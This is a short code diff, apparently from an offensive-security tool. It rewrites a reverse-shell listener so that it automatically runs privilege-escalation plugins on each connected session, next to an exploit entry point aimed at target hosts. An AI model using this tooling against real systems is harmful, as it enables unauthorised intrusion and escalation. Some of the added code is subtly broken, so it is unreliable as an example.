@@ -10,6 +10,7 @@ import os
 import utils
 from plugins.initial_access import *
 import constants
+import privesc
 
 
 def read_plugins_configs():
@@ -29,7 +30,21 @@ def read_plugins_configs():
 
 def listener(listener_port, listener_address):
     sys.stdin = open(0)
-    rs_client.main(listener_port, listener_address)
+    persistent = False
+    hosts = None
+    sock = None
+
+    if hosts:
+        hosts = hosts.split(",")
+
+    try:
+        sock = rs_client.Socket(listener_port, listener_address)
+        sock.listen(hosts)
+        shell = rs_client.Shell(sock, persistent)
+        privesc.load_all_plugins(sock, shell)
+
+    except KeyboardInterrupt:
+        sock.close()
 
 
 def exploit(plugin_name, target_ip, target_port, local_ip, local_port):
